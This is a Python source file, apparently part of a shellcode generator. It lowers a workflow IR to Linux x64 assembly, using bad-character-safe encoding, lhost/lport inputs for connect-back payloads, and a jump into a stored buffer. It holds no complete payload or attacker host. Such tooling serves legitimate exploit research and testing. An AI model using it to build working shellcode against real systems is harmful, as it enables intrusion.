"""Linux x64 backend: lower validated Workflow IR to Linux x64 assembly text.

Generates the payload section of the assembly output for Linux x64 targets.
Uses the Linux syscall convention:
  - Syscall number in RAX
  - Arguments in RDI, RSI, RDX, R10, R8, R9 (up to 6)
  - Return value in RAX
  - RCX and R11 are clobbered by the kernel

All stack references go through the layout's slot().rsp_ref so the
allocation system owns physical offsets.
"""
from __future__ import annotations

import socket
import struct

from ..api_database import STRUCT_DATABASE, STRUCT_DATABASE_X64
from ..encode_x64 import (
    encode_dword_into_r64,
    encode_qword,
    safe_dword_store_x64,
    safe_lea_x64,
    safe_mem_load_x64,
    safe_qword_store,
    safe_word_store_x64,
)
from .ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    Block,
    CallAPI,
    CallBuffer,
    Compare,
    ConstructString,
    DefineConstant,
    Immediate,
    Input,
    Jump,
    NameRef,
    Operation,
    StoreLocal,
    SuccessPredicate,
    Syscall,
    Terminate,
    TerminateStyle,
    ValueRef,
    Workflow,
    WriteStructField,
    ZeroStruct,
)

_SYSCALL_ARG_REGS = ("rdi", "rsi", "rdx", "r10", "r8", "r9")

_DWORD_REG = {
    "rax": "eax", "rbx": "ebx", "rcx": "ecx", "rdx": "edx",
    "rsi": "esi", "rdi": "edi", "rbp": "ebp", "rsp": "esp",
    "r8": "r8d", "r9": "r9d", "r10": "r10d", "r11": "r11d",
    "r12": "r12d", "r13": "r13d", "r14": "r14d", "r15": "r15d",
}

_WORD_REG = {
    "rax": "ax", "rbx": "bx", "rcx": "cx", "rdx": "dx",
    "rsi": "si", "rdi": "di",
    "r8": "r8w", "r9": "r9w", "r10": "r10w", "r11": "r11w",
}


def lower_workflow_linux_x64(
    workflow: Workflow,
    layout: object,
    badchars: set[int],
    config: object | None = None,
) -> str:
    ctx = _LoweringContext(layout, badchars, config)
    lines: list[str] = []

    lines.append(f"; -- Workflow (linux-x64): {workflow.name} --")
    lines.append("")

    lowered = {block.name: ctx.lower_block(block) for block in workflow.blocks}

    terminal = [b.name for b in workflow.blocks if _is_terminal(b)]
    normal = [b.name for b in workflow.blocks if not _is_terminal(b)]

    if terminal and workflow.entry in normal:
        lines.append(f"    jmp  wf_{workflow.entry}")
        lines.append("")
        for name in terminal:
            lines.extend(lowered[name])
        for name in normal:
            lines.extend(lowered[name])
    else:
        for block in workflow.blocks:
            lines.extend(lowered[block.name])

    return "\n".join(lines)


def _is_terminal(block: Block) -> bool:
    return any(isinstance(op, (Terminate, CallBuffer)) for op in block.operations)


class _LoweringContext:

    def __init__(self, layout: object, badchars: set[int], config: object | None) -> None:
        self.layout = layout
        self.bc = badchars
        self.config = config
        self.constants: dict[str, int] = {}
        self.struct_types: dict[str, str] = {}
        self._hang_counter = 0

    def lower_block(self, block: Block) -> list[str]:
        lines: list[str] = []
        lines.append(f"wf_{block.name}:")
        for op in block.operations:
            lines.extend(self._lower_op(op))
        lines.append("")
        return lines

    def _lower_op(self, op: Operation) -> list[str]:
        if isinstance(op, DefineConstant):
            self.constants[op.name] = op.value
            return [f"    ; const {op.name} = 0x{op.value:x}"]

        if isinstance(op, AllocateStruct):
            self.struct_types[op.name] = op.struct_type
            return []

        if isinstance(op, (ConstructString, AllocateLocal)):
            return []

        if isinstance(op, ZeroStruct):
            return self._lower_zero_struct(op)

        if isinstance(op, WriteStructField):
            return self._lower_write_struct_field(op)

        if isinstance(op, StoreLocal):
            return self._lower_store_local(op)

        if isinstance(op, Syscall):
            return self._lower_syscall(op)

        if isinstance(op, CallAPI):
            raise ValueError("CallAPI is not supported in Linux workflows")

        if isinstance(op, Compare):
            return self._lower_compare(op)

        if isinstance(op, Jump):
            return [f"    jmp  wf_{op.target}"]

        if isinstance(op, Terminate):
            return self._lower_terminate(op)

        if isinstance(op, CallBuffer):
            return self._lower_call_buffer(op)

        return [f"    ; UNHANDLED: {type(op).__name__}"]

    def _lower_syscall(self, op: Syscall) -> list[str]:
        lines: list[str] = []
        lines.append(f"    ; syscall {op.number}")

        for i, arg in enumerate(op.arguments):
            reg = _SYSCALL_ARG_REGS[i]
            lines.extend(self._load_value_into_reg(arg, reg))

        lines.extend(encode_dword_into_r64(op.number, self.bc, "rax"))
        lines.append("    syscall")

        if op.result is not None:
            slot = self.layout.slot(op.result)
            lines.extend(safe_qword_store("rsp", slot.offset, "rax", self.bc))

        return lines

    def _lower_zero_struct(self, op: ZeroStruct) -> list[str]:
        struct_type = self.struct_types.get(op.name)
        if struct_type is None:
            return [f"    ; ZeroStruct '{op.name}': type unknown"]

        st_rec = STRUCT_DATABASE_X64.get(struct_type)
        if st_rec is None:
            st_rec = STRUCT_DATABASE.get(struct_type)
        if st_rec is None:
            return [f"    ; ZeroStruct '{op.name}': struct not in database"]

        slot = self.layout.slot(struct_type)
        size = st_rec.size
        qwords = size // 8

        lines: list[str] = [f"    ; zero {struct_type} (0x{size:x} bytes)"]
        lines.append("    xor  eax, eax")
        lines.extend(safe_lea_x64("rdi", "rsp", slot.offset, self.bc))

        if qwords <= 6:
            for i in range(qwords):
                lines.extend(safe_qword_store("rdi", i * 8, "rax", self.bc))
        else:
            lines.append(f"    mov  ecx, 0x{qwords:02x}")
            lines.append("    rep  stosq")

        return lines

    def _lower_write_struct_field(self, op: WriteStructField) -> list[str]:
        struct_type = self.struct_types.get(op.struct_name)
        if struct_type is None:
            return [f"    ; WriteStructField: unknown struct '{op.struct_name}'"]

        st_rec = STRUCT_DATABASE_X64.get(struct_type)
        if st_rec is None:
            st_rec = STRUCT_DATABASE.get(struct_type)
        if st_rec is None:
            return [f"    ; WriteStructField: struct '{struct_type}' not in database"]

        field_map = {f.name: f for f in st_rec.fields}
        field = field_map.get(op.field_name)
        if field is None:
            return [f"    ; WriteStructField: field '{op.field_name}' not in {struct_type}"]

        struct_slot = self.layout.slot(struct_type)
        abs_offset = struct_slot.offset + field.offset

        lines: list[str] = [f"    ; {struct_type}.{op.field_name}"]

        if field.size == 2:
            lines.extend(self._load_value_into_reg(op.value, "r11"))
            r11w = _WORD_REG.get("r11", "r11w")
            lines.extend(safe_word_store_x64("rsp", abs_offset, r11w, self.bc))
        elif field.size <= 4:
            lines.extend(self._load_value_into_reg(op.value, "r11"))
            lines.extend(safe_dword_store_x64("rsp", abs_offset, "r11d", self.bc))
        else:
            lines.extend(self._load_value_into_reg(op.value, "r11"))
            lines.extend(safe_qword_store("rsp", abs_offset, "r11", self.bc))

        return lines

    def _lower_store_local(self, op: StoreLocal) -> list[str]:
        slot = self.layout.slot(op.name)
        lines: list[str] = [f"    ; store {op.name}"]
        lines.extend(self._load_value_into_reg(op.value, "r11"))
        lines.extend(safe_qword_store("rsp", slot.offset, "r11", self.bc))
        return lines

    def _lower_compare(self, op: Compare) -> list[str]:
        slot = self.layout.slot(op.value)
        lines: list[str] = []
        lines.extend(safe_mem_load_x64("rax", "rsp", slot.offset, self.bc))

        if op.predicate == SuccessPredicate.ZERO:
            lines.append("    test rax, rax")
            lines.append(f"    jz   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.NONZERO:
            lines.append("    test rax, rax")
            lines.append(f"    jnz  wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.SIGNED_NEGATIVE:
            lines.append("    test rax, rax")
            lines.append(f"    js   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.NULL:
            lines.append("    test rax, rax")
            lines.append(f"    jz   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")
        elif op.predicate == SuccessPredicate.INVALID_HANDLE:
            lines.append("    cmp  rax, -1")
            lines.append(f"    je   wf_{op.true_block}")
            lines.append(f"    jmp  wf_{op.false_block}")

        return lines

    def _lower_terminate(self, op: Terminate) -> list[str]:
        self._hang_counter += 1
        label = f"_hang_{self._hang_counter}" if self._hang_counter > 1 else "_hang"
        return [f"{label}:", f"    jmp  {label}"]

    def _lower_call_buffer(self, op: CallBuffer) -> list[str]:
        slot = self.layout.slot(op.name)
        lines: list[str] = [f"    ; jump to buffer '{op.name}'"]
        lines.extend(safe_mem_load_x64("rax", "rsp", slot.offset, self.bc))
        lines.append("    jmp  rax")
        return lines

    def _load_value_into_reg(self, ref: ValueRef, reg: str) -> list[str]:
        dreg = _DWORD_REG.get(reg, reg + "d")

        if isinstance(ref, Immediate):
            val = ref.value
            if val == 0:
                return [f"    xor  {dreg}, {dreg}"]
            if 0 < val <= 0xFFFFFFFF:
                return list(encode_dword_into_r64(val, self.bc, reg))
            return list(encode_qword(val, self.bc, reg))

        if isinstance(ref, NameRef):
            name = ref.name
            if name in self.constants:
                cval = self.constants[name]
                if cval == 0:
                    return [f"    xor  {dreg}, {dreg}"]
                return list(encode_dword_into_r64(cval, self.bc, reg))
            slot = self.layout.slot(name)
            return list(safe_mem_load_x64(reg, "rsp", slot.offset, self.bc))

        if isinstance(ref, AddressOf):
            name = ref.name
            stype = self.struct_types.get(name)
            if stype is not None:
                slot = self.layout.slot(stype)
            else:
                slot = self.layout.slot(name)
            return list(safe_lea_x64(reg, "rsp", slot.offset, self.bc))

        if isinstance(ref, Input):
            return self._resolve_input(ref, reg)

        return [f"    ; UNRESOLVED: {ref}"]

    def _resolve_input(self, ref: Input, reg: str) -> list[str]:
        dreg = _DWORD_REG.get(reg, reg + "d")
        cfg = self.config

        if ref.name == "lhost":
            if hasattr(cfg, "lhost") and cfg.lhost:
                ip_int = struct.unpack("!I", socket.inet_aton(cfg.lhost))[0]
                return list(encode_dword_into_r64(ip_int, self.bc, reg))
            return [f"    ; INPUT lhost: not configured"]

        if ref.name == "lport":
            if hasattr(cfg, "lport") and cfg.lport:
                port_be = struct.unpack("!H", struct.pack("!H", cfg.lport))[0]
                return list(encode_dword_into_r64(port_be, self.bc, reg))
            return [f"    ; INPUT lport: not configured"]

        if ref.name == "command":
            return [f"    ; INPUT command: resolved via ConstructString"]

        return [f"    ; INPUT {ref.name}: not handled in Linux backend"]
